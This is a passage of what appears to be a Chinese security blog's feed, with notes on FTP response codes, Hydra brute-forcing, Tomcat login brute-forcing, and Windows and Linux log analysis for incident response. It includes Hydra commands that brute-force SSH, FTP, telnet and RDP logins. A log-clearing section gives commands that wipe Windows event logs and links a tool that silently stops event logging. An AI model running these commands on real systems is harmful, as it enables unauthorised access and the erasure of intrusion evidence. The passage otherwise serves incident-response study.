title="常用"></a>常用</h3><table><thead><tr><th>状态码</th><th>描述</th></tr></thead><tbody><tr><td>230</td><td>用户登录</td></tr><tr><td>226</td><td>请求的文件操作成功</td></tr><tr><td>213</td><td>文件状态</td></tr><tr><td>530</td><td>账号或密码错误</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">FTP应答码&amp;响应码</span><br><span class="line"></span><br><span class="line">110： 重新启动标记应答。</span><br><span class="line">120： 在n分钟内准备好</span><br><span class="line">125： 连接打开准备传送</span><br><span class="line">150： 打开数据连接</span><br><span class="line">200： 命令成功</span><br><span class="line">202： 命令失败</span><br><span class="line">211： 系统状态</span><br><span class="line">212： 目录状态</span><br><span class="line">213： 文件状态</span><br><span class="line">214： 帮助信息</span><br><span class="line">215： 名字系统类型</span><br><span class="line">220： 新用户服务准备好了</span><br><span class="line">221： 服务关闭控制连接，可以退出登录</span><br><span class="line">225： 数据连接打开，无传输正在进行</span><br><span class="line">226： 关闭数据连接，请求的文件操作成功</span><br><span class="line">227： 进入被动模式</span><br><span class="line">230： 用户登录</span><br><span class="line">250： 请求的文件操作完成</span><br><span class="line">257： 创建”PATHNAME”</span><br><span class="line">331： 用户名正确，需要口令</span><br><span class="line">332： 登录时需要帐户信息</span><br><span class="line">350： 下一步命令</span><br><span class="line">421： 不能提供服务，关闭控制连接</span><br><span class="line">425： 不能打开数据连接</span><br><span class="line">426： 关闭连接，中止传输</span><br><span class="line">450： 请求的文件操作未执行</span><br><span class="line">451： 中止请求的操作：有本地错误</span><br><span class="line">452： 未执行请求的操作：系统存储空间不足</span><br><span class="line">500： 格式错误，命令不可识别</span><br><span class="line">501： 参数语法错误</span><br><span class="line">502： 命令未实现</span><br><span class="line">503： 命令顺序错误</span><br><span class="line">504： 此参数下的命令功能未实现</span><br><span class="line">530： 未登录</span><br><span class="line">532： 存储文件需要帐户信息</span><br><span class="line">550： 未执行请求的操作</span><br><span class="line">551： 请求操作中止：页类型未知</span><br><span class="line">552： 请求的文件操作中止，存储分配溢出</span><br><span class="line">553： 未执行请求的操作：文件名不合法</span><br><span class="line"></span><br><span class="line">FTP术语</span><br><span class="line">150　　　 文件状态良好，打开数据连接</span><br><span class="line">200　　　 命令成功</span><br><span class="line">202　　　 命令未实现</span><br><span class="line">211　　　 系统状态或系统帮助响应</span><br><span class="line">212　　　 目录状态</span><br><span class="line">213　　　 文件状态</span><br><span class="line">214　　　 帮助信息，信息仅对人类用户有用</span><br><span class="line">215　　　 名字系统类型</span><br><span class="line">220　　　 对新用户服务准备好</span><br><span class="line">221　　　 服务关闭控制连接，可以退出登录</span><br><span class="line">225　　　 数据连接打开，无传输正在进行</span><br><span class="line">226　　　 关闭数据连接，请求的文件操作成功</span><br><span class="line">227　　　 进入被动模式</span><br><span class="line">230　　　 用户登录</span><br><span class="line">250　　　 请求的文件操作完成</span><br><span class="line">257　　　 创建”PATHNAME”</span><br><span class="line">331　　　 用户名正确，需要口令</span><br><span class="line">332　　　 登录时需要帐户信息</span><br><span class="line">350　　　 请求的文件操作需要进一步命令</span><br><span class="line">421　　　 连接用户过多</span><br><span class="line">425　　　 不能打开数据连接</span><br><span class="line">426　　　 关闭连接，中止传输</span><br><span class="line">450 　　　请求的文件操作未执行</span><br><span class="line">451 　　　中止请求的操作：有本地错误</span><br><span class="line">452 　　　未执行请求的操作：系统存储空间不足</span><br><span class="line">500 　　　格式错误，命令不可识别</span><br><span class="line">501 　　　参数语法错误</span><br><span class="line">502 　　　命令未实现</span><br><span class="line">503 　　　命令顺序错误</span><br><span class="line">504　　　 此参数下的命令功能未实现</span><br><span class="line">530 　　　账号或密码错误</span><br><span class="line">532 　　　存储文件需要帐户信息</span><br><span class="line">550 　　　未执行请求的操作</span><br><span class="line">551　　　 请求操作中止：页类型未知</span><br><span class="line">552　　　 请求的文件操作中止，存储分配溢出</span><br><span class="line">553　　　 未执行请求的操作：文件名不合法</span><br></pre></td></tr></table></figure><h2 id="连接模式"><a href="#连接模式" class="headerlink" title="连接模式"></a>连接模式</h2><h3 id="主动模式PORT"><a href="#主动模式PORT" class="headerlink" title="主动模式PORT"></a>主动模式PORT</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/25303e8b6c12b922a81b42456d3c1374.png" alt="img"></p><h3 id="被动模式PASV"><a href="#被动模式PASV" class="headerlink" title="被动模式PASV"></a>被动模式PASV</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/a1d996c9d307cd9e955002abdd05426a.png" alt="img"></p><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>主动模式和被动模式的不同简单概述为： 主动模式传送数据时是“服务器”连接到“客户端”的端口（客户端开启数据端口）；被动模式传送数据是“客户端”连接到“服务器”的端口（服务端开启数据端口）。</p><p><strong>主动模式</strong>需要客户端必须开放端口给FTP服务端，很多客户端都是在防火墙内，开放端口给FTP服务器访问比较困难。</p><p><strong>被动模式</strong>只需要服务器端开放端口给客户端连接就行了，如果服务端在防火墙内，也需要做端口映射才行。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/jingzi123456789/article/details/83409572">FTP的主动模式和被动模式工作原理及抓包分析</a></p><p><a href="https://help.aliyun.com/document_detail/92048.html">手动搭建FTP站点</a></p><p><a href="https://my.oschina.net/chenguang/blog/375311">FTP服务器日志解析</a></p><p><a href="https://www.cnblogs.com/zhengchunyuan/p/9212361.html">vsftp日志xferlog格式分析</a></p><p><a href="https://blog.csdn.net/cbffyx/article/details/78891603">FTP应答码&amp;响应码</a></p>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hydra</title>
      <link href="/p/d0f422c5.html"/>
      <url>/p/d0f422c5.html</url>
      
        <content type="html"><![CDATA[<h2 id="支持协议"><a href="#支持协议" class="headerlink" title="支持协议"></a>支持协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br></pre></td></tr></table></figure><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-R</td><td>继续爆破先前中止/崩溃的会话</td></tr><tr><td>-S</td><td>执行 SSL 连接</td></tr><tr><td>-s PORT</td><td>指定非默认端口</td></tr><tr><td>-l  LOGIN</td><td>使用 LOGIN 名称登录</td></tr><tr><td>-L FILE</td><td>从 FILE 加载多个登录名</td></tr><tr><td>-p PASS</td><td>尝试密码 PASS</td></tr><tr><td>-P FILE</td><td>从 FILE 加载多个密码</td></tr><tr><td>-e nsr</td><td>n 使用空密码，s 用户名作为密码， r用户名倒过来作为密码</td></tr><tr><td>-C FILE</td><td>使用冒号分割格式，例如“登录名:密码”而不是 -L/-P 选项</td></tr><tr><td>-M FILE</td><td>从文件中获取攻击列表，:后带端口，一行一条</td></tr><tr><td>-o FILE</td><td>输出到指定文件</td></tr><tr><td>-b FORMAT</td><td>指定-o输出格式，默认为txt</td></tr><tr><td>-f / -F</td><td>在-M列表攻击模式下，找到第一个解锁的密码停止破解，-f 停止对当前主机破解，-F停止所有主机</td></tr><tr><td>-t TASKS</td><td>同时并行线程数，默认为16</td></tr><tr><td>-T TASKS</td><td>在-M列表模式下，整体的并行数量</td></tr><tr><td>-w / -W TIME</td><td>最大超时时间，单位s 默认30s</td></tr><tr><td>-v / -V / -d</td><td>详细模式/每次尝试都显示登录+通过/调试模式</td></tr><tr><td>server</td><td>目标IP/DNS/网段</td></tr><tr><td>service</td><td>支持服务名</td></tr></tbody></table><h2 id="破解ssh"><a href="#破解ssh" class="headerlink" title="破解ssh"></a>破解ssh</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l xxx -P test_password.txt -V [ip] ssh </span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907142152059.png" alt="image-20210907142152059"></p><h2 id="破解ftp"><a href="#破解ftp" class="headerlink" title="破解ftp"></a>破解ftp</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L test_users.txt -P test_password.txt -V -f ftp://192.168.77.199</span><br></pre></td></tr></table></figure><h2 id="破解telnet"><a href="#破解telnet" class="headerlink" title="破解telnet"></a>破解telnet</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.77.199 telnet -L test_users.txt -P test_password.txt -V</span><br></pre></td></tr></table></figure><h2 id="破解RDP"><a href="#破解RDP" class="headerlink" title="破解RDP"></a>破解RDP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.77.199 rdp -L test_users.txt -P test_password.txt -V</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暴力破解常用工具</title>
      <link href="/p/df53a981.html"/>
      <url>/p/df53a981.html</url>
      
        <content type="html"><![CDATA[<h1 id="tomcat认证爆破"><a href="#tomcat认证爆破" class="headerlink" title="tomcat认证爆破"></a>tomcat认证爆破</h1><p>密码特征：用户名密码<code>:</code>相连，base64编码</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906195540654.png" alt="image-20210906195540654"></p><p>使用迭代器，添加第一个字符串的字典</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906195824006.png" alt="image-20210906195824006"></p><p>同理添加第2，3个要拼接的字符串</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906195837171.png" alt="image-20210906195837171"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906195918991.png" alt="image-20210906195918991"></p><p>进行base64编码</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906200007890.png" alt="image-20210906200007890"></p><p>成功返回200，失败返回401</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906200045570.png" alt="image-20210906200045570"></p><h1 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h1><p><a href="https://dropann.github.io/p/d0f422c5.html">https://dropann.github.io/p/d0f422c5.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows日志</title>
      <link href="/p/24f823ca.html"/>
      <url>/p/24f823ca.html</url>
      
        <content type="html"><![CDATA[<h2 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h2><h3 id="windows-2000专业版-windows-Server2003-windows-XP"><a href="#windows-2000专业版-windows-Server2003-windows-XP" class="headerlink" title="windows 2000专业版/windows Server2003/windows XP"></a>windows 2000专业版/windows Server2003/windows XP</h3><p>系统日志 <code>C:\Windows\System32\config\SysEvent.evt</code></p><p>安全性日志 <code>C:\Windows\System32\config\SecEvent.evt</code></p><p>应用程序日志 <code>C:\Windows\System32\config\AppEvent.evt</code></p><h3 id="Vista-win7-win8-win10-winser2008以上"><a href="#Vista-win7-win8-win10-winser2008以上" class="headerlink" title="Vista/win7/win8/win10/winser2008以上"></a>Vista/win7/win8/win10/winser2008以上</h3><p>系统日志 <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p><p>安全性日志 <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p><p>应用程序日志 <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p><p>事件查看器 <code>win+r --&gt; eventvwr</code></p><h2 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a>日志分类</h2><h3 id="1-系统日志"><a href="#1-系统日志" class="headerlink" title="1.系统日志"></a>1.系统日志</h3><p>主要记录驱动程序，操作系统的多种组件，应用软件在运行中出现的重大问题，包括重要数据的丢失、错误，以及系统产生的崩溃行为等。</p><h3 id="2-安全性日志"><a href="#2-安全性日志" class="headerlink" title="2.安全性日志"></a>2.安全性日志</h3><p>主要记录各种与安全相关的事件，包括登录与退出系统的成功与不成功信息，对系统中重要资源的各种操作，对系统文件创建、删除、更改等操作。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621151545645-ed87a0f2-18b8-46a6-acf0-3f90ed9ae6b0.png" alt="img"></p><h3 id="3-应用程序日志"><a href="#3-应用程序日志" class="headerlink" title="3.应用程序日志"></a>3.应用程序日志</h3><p>记录各种应用程序产生的各类事件</p><mark class="hl-label orange">注意</mark>  windows 2000专业版/windows Server2003/windows XP中只有应用程序、安全性、系统三类日志。<p><strong>PowerShell日志</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906143917888.png" alt="image-20210906143917888"></p><h2 id="日志常用事件ID"><a href="#日志常用事件ID" class="headerlink" title="日志常用事件ID"></a>日志常用事件ID</h2><p><a href="https://docs.microsoft.com/zh-cn/windows/security/identity-protection/">标识和访问管理</a></p><h3 id="应急响应中常用"><a href="#应急响应中常用" class="headerlink" title="应急响应中常用"></a>应急响应中常用</h3><table><thead><tr><th>事件ID(旧版本)</th><th>事件ID(新版本)</th><th>描述</th><th>事件日志</th></tr></thead><tbody><tr><td>528</td><td>4624</td><td>成功登录</td><td>安全</td></tr><tr><td>529</td><td>4625</td><td>失败登录</td><td>安全</td></tr><tr><td>680</td><td>4776</td><td>成功/失败的账户认证</td><td>安全</td></tr><tr><td>624</td><td>4720</td><td>创建用户</td><td>安全</td></tr><tr><td>636</td><td>4732</td><td>添加用户到启用安全性的本地组中</td><td>安全</td></tr><tr><td>632</td><td>4728</td><td>添加用户到启用安全性的全局组中</td><td>安全</td></tr><tr><td>2934</td><td>7030</td><td>服务创建错误</td><td>系统</td></tr><tr><td>2944</td><td>7040</td><td>IPSEC服务的启动类型已从禁用更改为自动启动</td><td>系统</td></tr><tr><td>2949</td><td>7045</td><td>服务创建</td><td>系统</td></tr></tbody></table><h3 id="登录相关日志事件ID"><a href="#登录相关日志事件ID" class="headerlink" title="登录相关日志事件ID"></a>登录相关日志事件ID</h3><table><thead><tr><th>事件ID</th><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>4624</td><td>用户登录成功</td><td>在目标计算机上创建登录会话时 (此事件) 。 它会在已访问的计算机上生成，其中创建了会话。</td></tr><tr><td>4625</td><td>用户登录失败</td><td>如果在帐户已被锁定时尝试登录账户失败，则生成此事件。</td></tr><tr><td>4672</td><td>特殊权限用户登录</td><td>特殊权限登录，如登录Administrator,一般会看到4624和4672一起出现</td></tr><tr><td>4648</td><td>显式凭证登录</td><td>当进程通过显式指定帐户的凭据尝试登录帐户时。这最常发生在批处理类型配置（如计划任务）中，或者使用”RUNAS/USER”命令时(不过在使用runas时，也会产生4624)</td></tr></tbody></table><h3 id="登录类型"><a href="#登录类型" class="headerlink" title="登录类型"></a>登录类型</h3><table><thead><tr><th>ID</th><th>登录类型(LogonType)</th><th>描述</th></tr></thead><tbody><tr><td>2</td><td>Interactive</td><td>用户登录到本机</td></tr><tr><td>3</td><td>Network</td><td>用户或计算手机从网络登录到本机，如果网络共享，或使用 net use 访问网络共享，net view 查看网络共享</td></tr><tr><td>4</td><td>Batch</td><td>批处理登录类型，无需用户干预</td></tr><tr><td>5</td><td>Service</td><td>服务控制管理器登录</td></tr><tr><td>7</td><td>Unlock</td><td>用户解锁主机</td></tr><tr><td>8</td><td>NetworkCleartext</td><td>用户从网络登录到此计算机，用户密码用非哈希的形式传递</td></tr><tr><td>9</td><td>NewCredentials</td><td>进程或线程克隆了其当前令牌，但为出站连接指定了新凭据</td></tr><tr><td>10</td><td>Remotelnteractive</td><td>使用终端服务或远程桌面连接登录</td></tr><tr><td>11</td><td>Cachedlnteractive</td><td>用户使用本地存储在计算机上的凭据登录到计算机（域控制器可能无法验证凭据），如主机不能连接域控，以前使用域账户登录过这台主机，再登录就会产生这样日志</td></tr><tr><td>12</td><td>CachedRemotelnteractive</td><td>与Remotelnteractive 相同，内部用于审计目的</td></tr><tr><td>13</td><td>CachedUnlock</td><td>登录尝试解锁</td></tr></tbody></table><h3 id="启用事件相关"><a href="#启用事件相关" class="headerlink" title="启用事件相关"></a>启用事件相关</h3><table><thead><tr><th>事件</th><th>事件ID</th><th>事件级别</th><th>事件日志</th><th>事件来源</th></tr></thead><tbody><tr><td>关机初始化失败</td><td>1074</td><td>警告</td><td>User32</td><td>User32</td></tr><tr><td>Windows关闭</td><td>13</td><td>信息</td><td>系统</td><td>Kernel-General</td></tr><tr><td>Windows启动</td><td>12</td><td>信息</td><td>系统</td><td>Kernel-General</td></tr></tbody></table><h3 id="日志清除相关"><a href="#日志清除相关" class="headerlink" title="日志清除相关"></a>日志清除相关</h3><table><thead><tr><th>事件</th><th>事件ID</th><th>事件级别</th><th>事件日志</th><th>事件来源</th></tr></thead><tbody><tr><td>事件日志服务关闭</td><td>1100</td><td>信息</td><td>安全</td><td>EventLog</td></tr><tr><td>事件日志被清除</td><td>104</td><td>信息</td><td>系统</td><td>EventLog</td></tr><tr><td>事件日志被清除</td><td>1102</td><td>信息</td><td>安全</td><td>EventLog</td></tr></tbody></table><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907103024034.png" alt="image-20210907103024034"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907103046020.png" alt="image-20210907103046020"></p><p><a href="https://docs.microsoft.com/zh-cn/windows/security/identity-protection/">Windows事件ID大全</a></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="内置筛选器"><a href="#内置筛选器" class="headerlink" title="内置筛选器"></a>内置筛选器</h3><p>筛选内容：记录时间、事件级别、任务类别、关键字等</p><h3 id="PowerShell进行日志分析"><a href="#PowerShell进行日志分析" class="headerlink" title="PowerShell进行日志分析"></a>PowerShell进行日志分析</h3><h4 id="Get-EventLog和Get-WinEvent区别"><a href="#Get-EventLog和Get-WinEvent区别" class="headerlink" title="Get-EventLog和Get-WinEvent区别"></a><code>Get-EventLog</code>和<code>Get-WinEvent</code>区别</h4><p><code>Get-EventLog</code>只获取传统的事件日志，<code>Get-WinEvent</code>是从传统的事件日志和新Windows事件日志技术生成的事件日志中获取事件，但同时需要<code>Vista</code>,<code>server2008</code>还需要<code>.NET 3.5以上版本</code></p><p>Get-EventLog筛选日志</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-EventLog</span> Security <span class="literal">-instanceid</span> <span class="number">4624</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906165840352.png" alt="image-20210906165840352"></p><p>Get-WinEvent筛选日志</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;Logname=<span class="string">&#x27;security&#x27;</span>;ID=<span class="string">&#x27;4624&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906170344196.png" alt="image-20210906170344196"></p><h3 id="日志工具"><a href="#日志工具" class="headerlink" title="日志工具"></a>日志工具</h3><h4 id="fulleventlogview"><a href="#fulleventlogview" class="headerlink" title="fulleventlogview"></a>fulleventlogview</h4><p><a href="https://www.nirsoft.net/utils/full_event_log_view.html">下载地址</a></p><p>免安装，检索速度比自带的好。默认是7天日志，可在高级选项中更改。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210906163615943.png" alt="image-20210906163615943"></p><h2 id="日志清除"><a href="#日志清除" class="headerlink" title="日志清除"></a>日志清除</h2><p>以下内容主要参考：<a href="https://www.cnblogs.com/xiaozi/p/13633934.html">Windows 入侵痕迹清理技巧</a></p><h3 id="windows日志"><a href="#windows日志" class="headerlink" title="windows日志"></a>windows日志</h3><p>1.事件查看器，清除日志</p><p>2.命令行清除日志</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PowerShell <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-ListLog</span> Application,Setup,Security <span class="literal">-Force</span> | % &#123;Wevtutil.exe cl <span class="variable">$_</span>.Logname&#125;</span><br></pre></td></tr></table></figure><p>3.利用脚本停止日志记录</p><p>该脚本遍历事件日志服务进程（专用svchost.exe）的线程堆栈，并标识事件日志线程以杀死事件日志服务线程。因此，系统将无法收集日志，同时事件日志服务似乎正在运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hlldz/Invoke-Phant0m</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux日志</title>
      <link href="/p/c8bc8d54.html"/>
      <url>/p/c8bc8d54.html</url>
      
        <content type="html"><![CDATA[<h2 id="日志存放位置"><a href="#日志存放位置" class="headerlink" title="日志存放位置"></a>日志存放位置</h2><p>linux下日志文件一般存放在<code>/var/log/</code></p><p><code>/var/log/wtmp</code>  记录登录进入 退出 数据交换 关机 重启。即<code>last</code>命令</p><p><code>/var/log/cron</code>  记录与定时任务相关的日志信息</p><p><code>/var/log/messages</code>  记录系统重启后的日志信息和错误日志(mail,cron,daemon,kern,auth等内容也记录在此)</p><p><code>/var/log/apache2/access.log</code> 记录Apache访问日志</p><p><code>/var/log/auth.log</code>  记录系统授权信息，包括用户登录和使用的权限机制</p><p><code>/var/log/userlog</code>  等级用户信息</p><p><code>/var/log/xferlog(vsftpd.log) </code>  ftp日志</p><p><code>/var/log/lastlog</code>  记录登录的用户===<code>lastlog</code> 命令</p><p><code>/var/log/secure</code>  记录大多数应用输入的账号和密码，以及是否成功登录</p><p><code>/var/log/faillog</code>  登录系统不成功的账号信息</p><p><code>ls -alt /var/spool/mail/</code>  查看邮件相关日志记录文件</p><p><code>cat /var/spool/mail/root</code>  邮件提醒</p><p><code>/var/log/sssd</code> 用于守护进程安全服务</p><h3 id="开启Ubuntu下cron日志"><a href="#开启Ubuntu下cron日志" class="headerlink" title="开启Ubuntu下cron日志"></a>开启Ubuntu下cron日志</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/rsyslog.d/50-default.conf</span><br></pre></td></tr></table></figure><p>文件中找到<code>cron.*</code>，把前面的#去掉，保存退出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service rsyslog restart</span><br></pre></td></tr></table></figure><p>实时查看日志：<code>less /var/log/cron.log</code></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="在-log日志文件中独立IP地址个数"><a href="#在-log日志文件中独立IP地址个数" class="headerlink" title="在*.log日志文件中独立IP地址个数"></a>在<code>*.log</code>日志文件中独立IP地址个数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;print$1&#125;&#x27; test.log | sort | uniq | wc -l</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621160839031-b36095ed-618e-4b78-b631-97edf5734e3d.png" alt="img"></p><h3 id="指定时间段日志"><a href="#指定时间段日志" class="headerlink" title="指定时间段日志"></a>指定时间段日志</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;/2021-05-10 00:01:28/,/2021-05-16 00:05:50/p&#x27; log_file_catalina.out</span><br><span class="line">sudo sed -n &#x27;/May 09 20:48:54/,/May 15 23:45:54/p&#x27; yum.log</span><br><span class="line">sed -n &#x27;/Sep  1 14:52:01/&#x27;,&#x27;/Sep  1 15:40:01/p&#x27; cron</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621173054449-0d1ac94d-2007-4173-8c88-a1015f002f29.png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grep &quot;May 15 23:*:*&quot; yum.log</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621173507781-b0099bc5-6a92-4c1c-8761-f52b332d5f74.png" alt="img"></p><h3 id="定位多少ip暴力破解root"><a href="#定位多少ip暴力破解root" class="headerlink" title="定位多少ip暴力破解root"></a>定位多少ip暴力破解root</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat secure | awk &#x27;/Failed password/&#123;print $(NF-3)&#125;&#x27;|sort|uniq -c |sort -k 1 -rn</span><br></pre></td></tr></table></figure><blockquote><p><code>NF</code>表示一条记录的字段的数目，<code>$(NF-3)</code>表示从后往前取第四列。</p></blockquote><h3 id="查看通过密码登录成功的IP地址总次数"><a href="#查看通过密码登录成功的IP地址总次数" class="headerlink" title="查看通过密码登录成功的IP地址总次数"></a>查看通过密码登录成功的IP地址总次数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /var/log/secure | awk &#x27;/Accepted password/&#123;print $(NF-3)&#125;&#x27;|sort|uniq -c |awk &#x27;&#123;print $2&quot;=&quot;$1;&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="免密登录成功总次数"><a href="#免密登录成功总次数" class="headerlink" title="免密登录成功总次数"></a>免密登录成功总次数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 